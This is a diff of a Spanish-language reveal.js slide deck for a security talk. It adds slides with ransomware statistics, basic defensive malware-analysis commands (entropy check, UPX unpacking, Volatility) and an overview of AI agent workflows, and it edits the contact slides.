+                                <li><strong>Wireshark</strong> — Análisis de tráfico</li>
+                                <li><strong>Volatility</strong> — Forensics memoria</li>
                             </ul>
                         </div>
                     </div>
                     <div>
-                        <div class="info-box" style="margin-bottom:0.3em">
-                            <h4>💰 Plataformas Bug Bounty</h4>
-                            <ul style="font-size:0.55em">
-                                <li><strong>Bugcrowd</strong> — Mejor para empezar</li>
-                                <li><strong>Intigriti</strong> — Mejor respuesta</li>
-                                <li><strong>HackerOne</strong> — Enterprise</li>
+                        <div class="info-box orange" style="margin-bottom:0.3em">
+                            <h4 style="color:var(--orange)">🔐 RANSOMWARE 2026</h4>
+                            <ul style="font-size:0.5em">
+                                <li>LockBit 4.0: Curve25519 + ChaCha20</li>
+                                <li>Encriptación híbrida (AES + RSA)</li>
+                                <li>68% cumplen su promesa de keys</li>
+                                <li>41% restaura desde backups</li>
                             </ul>
                         </div>
-                        <div class="info-box purple" style="text-align:center">
-                            <h4 style="color:var(--purple)">📧 Contacto</h4>
-                            <p style="font-size:0.62em;margin:0"><strong>@statick88</strong></p>
-                            <p style="font-size:0.55em;margin:0.1em 0">statick88.github.io</p>
-                            <p style="font-size:0.55em;margin:0">@flisol_loja</p>
-                            <div class="qr-box" style="margin-top:0.3em;display:inline-block">
-                                <img src="https://api.qrserver.com/v1/create-qr-code/?size=60x60&data=https://statick88.github.io/charla-dr-doom" alt="QR">
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <!-- SLIDE 16: GRACIAS + Q&A                                             -->
-            <!-- ═══════════════════════════════════════════════════════════════════ -->
-            <section>
-                <div class="phase-indicator">
-                    <span class="num">PREGUNTAS</span>
-                    <span class="text">5 min</span>
-                </div>
-                <h2 style="font-size:1.8em;color:var(--gold)">¿Preguntas?</h2>
-                <p style="font-size:0.7em;color:var(--text);margin:0.3em 0">Statick responde 🎤</p>
-                
-                <div style="display:flex;justify-content:center;gap:25px;margin:0.5em 0">
-                    <div style="text-align:center">
-                        <p style="font-size:1.3em;margin:0">🐙</p>
-                        <p style="font-size:0.55em;color:var(--cyan);margin:0">@statick88</p>
-                    </div>
-                    <div style="text-align:center">
-                        <p style="font-size:1.3em;margin:0">🌐</p>
-                        <p style="font-size:0.55em;color:var(--cyan);margin:0">statick88.github.io</p>
-                    </div>
-                    <div style="text-align:center">
-                        <p style="font-size:1.3em;margin:0">📱</p>
-                        <p style="font-size:0.55em;color:var(--cyan);margin:0">@flisol_loja</p>
-                    </div>
-                </div>
-
-                <p style="font-size:0.65em;color:var(--text-muted);margin-top:0.3em;font-style:italic">"Hack the planet — siempre con permiso" 🦹‍♂️</p>
-            </section>
-
+                        <div class="info-box green">
+                            <h4 style="color:var(--green)">💻 COMANDOS BÁSICOS</h4>
+                            <div class="terminal" style="font-size:0.4em">
+                                <div class="line"><span class="prompt">#</span> <span class="comment">Calcular entropía (packing)</span></div>
+                                <div class="line"><span class="command">python3 entropia.py malware.exe</span></div>
+                                <div class="line"><span class="prompt">#</span> <span class="comment">Unpacking UPX</span></div>
+                                <div class="line"><span class="command">upx -d malware.exe -o unpacked.exe</span></div>
+                                <div class="line"><span class="prompt">#</span> <span class="comment">Análisis de memoria</span></div>
+                                <div class="line"><span class="command">vol -f mem.raw --profile=Win10x64 pslist</span></div>
+            </div>
         </div>
     </div>
 
-    <script src="dist/reveal.js"></script>
-    <script src="plugin/zoom/zoom.js"></script>
-    <script src="plugin/notes/notes.js"></script>
-    <script src="plugin/search/search.js"></script>
-    <script src="plugin/markdown/markdown.js"></script>
-    <script src="plugin/highlight/highlight.js"></script>
-    
-    <script>
-        Reveal.initialize({
-            hash: true,
-            slideNumber: 'c/t',
-            showSlideNumber: 'all',
-            progress: true,
-            controls: true,
-            controlsTutorial: false,
-            transition: 'slide',
-            plugins: [RevealMarkdown, RevealHighlight, RevealNotes, RevealZoom, RevealSearch]
-        });
-    </script>
+    <!-- ═══════════════════════════════════════════════════════════════════════════ -->
+    <!-- SLIDE 15: AGENTES Y WORKFLOWS + DEPENDENCIAS                             -->
+    <!-- ═══════════════════════════════════════════════════════════════════════════ -->
+    <section>
+        <div class="phase-indicator">
+            <span class="num">AGENTES</span>
+            <span class="text">10 min</span>
+        </div>
+        <h2>🤖 Agentes y Workflows</h2>
+        <p style="font-size:0.62em;color:var(--text-muted)">Patrones de desarrollo y memoria persistente</p>
+
+        <div class="columns" style="margin-top:0.3em">
+            <div>
+                <div class="info-box cyan" style="margin-bottom:0.3em">
+                    <h4 style="color:var(--cyan)">👤 Modos de Agente</h4>
+                    <ul style="font-size:0.5em">
+                        <li><strong>Investigador</strong> - Análisis profundo, papers, metodologías</li>
+                        <li><strong>Desarrollador</strong> - Implementación, código limpio, tests</li>
+                        <li><strong>Orquestador</strong> - SDD, coordinación multi-agente</li>
+                        <li><strong>Experto</strong> - Dominio especializado (bird talk, seguridad)</li>
+                    </ul>
+                </div>
+                <div class="info-box green">
+                    <h4 style="color:var(--green)">💾 Memoria Engram</h4>
+                    <ul style="font-size:0.5em">
+                        <li>Persiste preferencias entre sesiones</li>
+                        <li>Guarda configuración charla FLISOL</li>
+                        <li>Almacena decisiones arquitectónicas</li>
+                        <li>Historial de tools y bibliotecas</li>
+                    </ul>
+                </div>
+            </div>
+            <div>
+                <div class="info-box orange" style="margin-bottom:0.3em">
+                    <h4 style="color:var(--orange)">🔄 SDD Orquestador</h4>
+                    <div class="terminal" style="font-size:0.4em">
+                        <div class="line"><span class="comment"># Ciclo SDD para bird talk</span></div>
+                        <div class="line"><span class="prompt">$</span> <span class="command">sdd-init</span>  ← Inicializar contexto</div>
+                        <div class="line"><span class="prompt">$</span> <span class="command">sdd-explore</span>  ← Investigar requisitos</div>
+                        <div class="line"><span class="prompt">$</span> <span class="command">sdd-spec</span>  ← Especificar charla</div>
+                        <div class="line"><span class="prompt">$</span> <span class="command">sdd-propose</span>  ← Proponer contenido</div>
+                        <div class="line"><span class="prompt">$</span> <span class="command">sdd-design</span>  ← Diseñar slides</div>
+                        <div class="line"><span class="prompt">$</span> <span class="command">sdd-apply</span>  ← Implementar contenido</div>
+                        <div class="line"><span class="prompt">$</span> <span class="command">sdd-verify</span>  ← Verificar calidad</div>
+                        <div class="line"><span class="prompt">$</span> <span class="command">sdd-archive</span>  ← Guardar versión</div>
+                    </div>
+                </div>
+                <div class="info-box purple">
+                    <h4 style="color:var(--purple)">📚 Dependencia Context7</h4>
+                    <p style="font-size:0.5em;color:var(--text);margin:0.2em 0">
+                        <code style="background:rgba(187,154,247,0.15);padding:2px 6px;border-radius:4px">/panaversity/learn-agentic-ai-from-low-code-to-code</code>
+                    </p>
+                    <p style="font-size:0.5em;color:var(--text-muted);margin:0">
+                        Patrones de agentes AI, workflows y mejores prácticas
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <div class="info-box" style="margin-top:0.4em">
+            <h4>⚙️ Configuración Recomendada</h4>
+            <div class="terminal" style="font-size:0.42em">
+                <div class="line"><span class="comment"># Preferencias de agente para bird talk</span></div>
+                <div class="line"><span class="prompt">$</span> <span class="command">export AGENT_ROLE=research</span>  ← Investigador profundo</div>
+                <div class="line"><span class="prompt">$</span> <span class="command">export ENGRAM_KEY=birdtalk-2026</span>  ← Memoria charla</div>
+                <div class="line"><span class="prompt">$</span> <span class="command">export SDD_MODE=true</span>  ← Workflow estructurado</div>
+                <div class="line"><span class="prompt">$</span> <span class="command">export CONTEXT7_LIB=/panaversity/learn-agentic-ai-from-low-code-to-code</span></div>
+            </div>
+        </div>
+    </section>
+
+
+
+    <section>
+        <div class="phase-indicator">
+            <span class="num">FIN</span>
+            <span class="text">Recursos y contactos</span>
+        </div>
+        <h2>📬 Contacto</h2>
+        <p style="font-size:0.62em;color:var(--text-muted)">Diego Medardo Saavedra García</p>
+        <p style="font-size:0.58em">@statick88 | Prof. ESPE, UIDE, Abacom | Máster UCM</p>
+    </section>
+
+    </div>
+</div>
 </body>
 </html>
